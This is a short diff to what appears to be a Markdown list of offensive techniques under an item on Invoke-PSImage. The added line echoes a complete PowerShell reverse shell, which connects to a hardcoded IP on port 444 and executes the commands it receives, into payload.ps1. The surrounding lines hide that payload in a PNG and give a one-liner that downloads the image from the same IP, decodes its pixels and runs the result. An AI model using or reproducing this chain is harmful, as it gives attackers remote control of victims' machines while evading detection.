@@ -12,6 +12,7 @@
 
 * PSImage: https://github.com/peewpw/Invoke-PSImage
 
+* `echo '$client = New-Object System.Net.Sockets.TCPClient("46.101.222.52",444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()' > payload.ps1`
 * `Import-Module .\Invoke-PSImage.ps1`
 * `Invoke-PSImage -Script .\payload.ps1 -Out .\evil.png -Image .\image.png -Web`
 * `sal a New-Object;Add-Type -A System.Drawing;$g=a System.Drawing.Bitmap((a Net.WebClient).OpenRead("http://46.101.222.52/evil.png"));$o=a Byte[] 1920;(0..0)|%{foreach($x in(0..1919)){$p=$g.GetPixel($x,$_);$o[$_*1920+$x]=([math]::Floor(($p.B-band15)*16)-bor($p.G -band 15))}};IEX([System.Text.Encoding]::ASCII.GetString($o[0..500]))`
